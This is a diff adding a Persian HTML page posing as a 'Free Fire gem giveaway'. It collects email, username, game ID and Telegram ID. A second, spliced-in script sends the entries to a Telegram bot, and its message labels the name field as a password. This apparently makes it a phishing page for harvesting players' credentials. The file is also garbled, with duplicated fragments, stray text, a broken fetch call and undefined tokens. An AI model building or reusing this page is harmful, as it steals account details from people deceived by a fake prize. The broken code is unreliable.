@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>قرعه‌کشی جم فری فایر</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body{
+  background:#111;
+  color:#fff;
+  font-family:sans-serif;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+  margin:0;
+}
+.box{
+  background:#1c1c1c;
+  padding:25px;
+  border-radius:16px;
+  width:100%;
+  max-width:400px;
+}
+input,button{
+  width:100%;
+  padding:12px;
+  margin-top:10px;
+  border-radius:10px;
+  border:none;
+  font-size:1rem;
+}
+input{
+  background:#2a2a2a;
+  color:#fff;
+}
+button{
+  background:#00c853;
+  font-weight:bold;
+  cursor:pointer;
+}
+#msg{
+  margin-top:12px;
+  text-align:center;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+  <h3 style="text-align:center">🎁 قرعه‌کشی جم فری فایر</h3>
+
+  <form id="form">
+    <input type="email" id="email" placeholder="ایمیل" required>
+    <input type="text" id="name" placeholder="نام کاربری" required>
+    <input type="text" id="ffid" placeholder="آیدی فری فایر" required>
+    <input type="text" id="telegram" placeholder="آیدی تلگرام (@username)" required>
+    <button type="submit">شرکت در قرعه‌کشی</button>
+  </form>
+
+  <div id="msg"></div>
+</div>
+
+<script>
+const form = document.getElementById("form");
+const msg  = document.getElementById("msg");
+
+form.addEventListener("submit", function(e){
+  e.preventDefault();
+
+  fetch("send.php", {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({
+      email: email.value,
+      name: name.value,
+      ffid: ffid.value,
+      telegram: telegram.value
+    })
+  })
+  .then(r => r.json())
+  .then(() => {
+    msg.innerText = "✅ با موفقیت ثبت شد";
+    form.reset();
+  })
+  .catch(() => {
+    msg.innerText = "❌ خطا در ارسال اطلاعات";
+  });
+});
+</script>
+
+</body>
+</html>orm.reset();
+  })
+  .catch(() => {
+    msg.innerText = "❌ خطا در ارسال";
+  });
+});
+</script>
+
+</body>
+</html>� @channel
+
+    const form = document.getElementById("giveawayForm");
+    const msg = document.getElementById("msg");
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      const name = document.getElementById("name").value;
+      const telegram = document.getElementById("telegram").value;
+      const email = document.getElementById("email").value;
+      const ffid = document.getElementById("ffid").value;
+
+      const text = `🎉 شرکت‌کننده جدید قرعه‌کشی
+
+👤 پسوورد: ${name}
+📱 تلگرام: ${telegram}
+📧 ایمیل: ${email}
+🎮 Free Fire ID: ${ffid}`;
+
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text
+          })
+        );
+
+        if (res.ok) {
+          msg.innerText = "✅ با موفقیت ثبت شد! موفق باشی 🍀";
+          form.reset();
+        } else {
+          msg.innerText = "❌ خطا در ارسال اطلاعات";
+        }
+      } catch (err) {
+        msg.innerText = "❌ مشکل اتصال به تلگرام";
+      }
+    });
+  </script></body>
+</html>
